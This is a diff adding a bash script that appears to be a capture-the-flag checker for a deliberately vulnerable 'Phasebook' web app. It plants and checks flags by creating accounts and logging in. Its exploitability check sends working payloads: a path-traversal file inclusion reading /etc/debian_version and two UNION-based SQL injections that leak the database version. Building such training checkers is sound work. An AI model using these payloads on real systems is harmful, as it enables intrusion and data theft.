@@ -1,0 +1,76 @@
+#!/bin/bash
+
+#$1 Host
+#$2 Flag name
+#$3 Flag data
+function PlantFlag(){
+    host=${1}
+    name=${2}
+    data=${3}
+    gender=$((RANDOM&1))
+    curl --silent --data 'create_account=&username='${name}'&password='${data}'&gender='${gender} 'http://'${host}'/Phasebook/index.php?p=new_account' >/dev/null
+}
+
+#$1 Host
+#$2 Flag name
+#$3 Flag data
+function CheckFlag(){
+    host=${1}
+    name=${2}
+    data=${3}
+    curl --silent --data 'login=&user='${name}'&password='${data} 'http://'${host}'/Phasebook/index.php'|grep 'You are logged in' >/dev/null 2>&1
+}
+
+#$1 Host
+function checkLocalFileInclusion(){
+    host=${1}
+    curl --silent "http://${host}/Phasebook/index.php?p=../../../../../../../../etc/debian_version" 2>&1 | grep 'squeeze/sid' >/dev/null
+}
+
+#$1 Host
+function checkSQLInjectionInProfile(){
+    host=${1}
+    curl --silent 'http://'${host}'/Phasebook/?p=profile&userid=1%20and%201%3D2%20union%20select%20%40%40version%2C%20gender%20from%20users%20where%20id%3D1' 2>&1 | grep '<h3>5.1.54-1ubuntu4</h3>' >/dev/null
+}
+
+#$1 Host
+function checkSQLInjectionInUserSearch(){
+    host=${1}
+    curl --silent --data "username=zzzz'%20limit%200%20union%20select%20%40%40version%2C%201%2C%201%20from%20users%23" 'http://'${host}'/Phasebook/?p=usersearch' 2>&1 | grep '5.1.54-1ubuntu4' >/dev/null
+}
+
+#$1 Host
+function Exploitable(){
+    host=${1}
+    count=0
+    checkLocalFileInclusion "${host}" && count=$((count+1))
+    checkSQLInjectionInProfile "${host}" && count=$((count+1))
+    checkSQLInjectionInUserSearch "${host}" && count=$((count+1))
+    echo "There are $count exploitable vulnerabilities."
+    test $count -gt 0 && exit 0 || exit 1
+}
+
+function Help(){
+    echo "Usage: ${0} -p <host> <flagname> <flagdata>"
+    echo "       ${0} -c <host> <flagname> <flagdata>"
+    echo "       ${0} -e <host>"
+    echo ""
+    echo "  -p  Plant flag"
+    echo "  -c  Check flag"
+    echo "  -e  Check exploitability"
+}
+
+case $1 in
+    "-p")
+        PlantFlag $2 $3 $4
+        ;;
+    "-c")
+        CheckFlag $2 $3 $4
+        ;;
+    "-e")
+        Exploitable $2
+        ;;
+     *)
+        Help
+        ;;
+esac
